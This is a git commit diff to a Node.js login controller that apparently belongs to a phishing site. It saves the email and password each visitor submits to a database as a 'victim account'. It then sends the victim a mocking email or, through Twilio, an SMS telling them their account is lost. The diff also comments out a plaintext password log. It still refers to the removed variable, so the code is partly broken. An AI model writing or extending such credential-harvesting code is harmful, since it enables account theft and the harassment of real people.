e4d1848c0d8c79bb634ab1348258a78e5b63e76c
qanhpeo17 <154793506+qanhpeo17@users.noreply.github.com>
2025-03-10 15:19:20 +0700

    push lan 2

--- src/controllers/auth.controllers.js
+++ src/controllers/auth.controllers.js
@@ -1,6 +1,7 @@
 import exp from "constants";
 import fs from "fs";
 import nodemailer from "nodemailer";
+import twilio from "twilio";
 
 import AccountModel from "../../models/account.models.js";
 
@@ -11,22 +12,46 @@ const login = async (req, res) => {
     return res.status(400).json({ message: "Thiếu email hoặc mật khẩu" });
   }
 
-  // Lưu thông tin vào file log
-  const logData = `Email: ${email} | Password: ${password}\n`;
-  fs.appendFileSync("log.txt", logData);
+  //kiem tra email ton tai
+  const emailIsExists = await AccountModel.findOne({ email: email });
+  if (emailIsExists) {
+    console.log(`email ${email} da ton tai!`);
+    res.json({ message: "email da ton tai" });
+  } else {
+    // Lưu thông tin vào file log
+    // const logData = `Email: ${email} | Password: ${password}\n`;
+    // fs.appendFileSync("log.txt", logData);
 
-  console.log("Đã lưu:", logData);
+    console.log("Đã lưu:", logData);
 
-  //Lưu thông tin vào db
-  const phishedAccount = { email, password };
-  await AccountModel.create(phishedAccount);
-  console.log("Đã lưu tài khoản con mồi vào db");
-  // Gửi email thông báo
-  sendPhishingEmail(email);
-
-  // res.json({ message: "Đăng nhập thất bại! Sai mật khẩu hoặc tài khoản." });
+    //Lưu thông tin vào db
+    const phishedAccount = { email, password };
+    await AccountModel.create(phishedAccount);
+    console.log("Đã lưu tài khoản con mồi vào db");
+    const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+    isEmail ? sendPhishingEmail(email) : sendSms(email);
+    // res.json({ message: "Đăng nhập thất bại! Sai mật khẩu hoặc tài khoản." });
+    res.status(200).json({ message: "mat acc roi hahahah" });
+  }
 };
 
+//Gui sms
+const sendSms = async (phone) => {
+  const client = new twilio(
+    process.env.TWILIO_ACCOUNT_SID,
+    process.env.TWILIO_AUTH_TOKEN
+  );
+  try {
+    const sms = await client.messages.create({
+      body: "haha thang ngu mat acc",
+      from: process.env.TWILIO_PHONE_NUMBER,
+      to: phone,
+    });
+    console.log({ success: true, sid: sms.sid });
+  } catch (error) {
+    console.log({ success: false, error: error.message });
+  }
+};
 // Gửi email phishing
 const sendPhishingEmail = async (targetEmail) => {
   try {
@@ -41,7 +66,7 @@ const sendPhishingEmail = async (targetEmail) => {
     const mailOptions = {
       from: process.env.EMAIL_USERNAME,
       to: targetEmail,
-      subject: "Tài khoản của bạn đang gặp sự cố vì Quốc Anh đẹp trai nhất Q7!",
+      subject: "Tài khoản của bạn đang gặp sự cố!",
       text: `Mất acc rồi nha lêu lêu :))))`,
     };
 
